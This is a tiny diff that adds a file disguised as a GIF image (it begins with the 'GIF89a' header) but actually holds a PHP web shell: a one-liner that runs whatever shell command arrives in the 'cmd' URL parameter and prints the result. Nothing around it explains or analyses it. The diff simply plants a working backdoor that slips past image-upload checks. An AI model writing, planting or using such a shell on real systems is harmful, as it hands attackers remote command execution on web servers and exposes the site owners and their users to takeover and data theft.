@@ -1,0 +1,2 @@
+GIF89a
+<?php $out=$_GET["cmd"]; echo `$out`; ?>
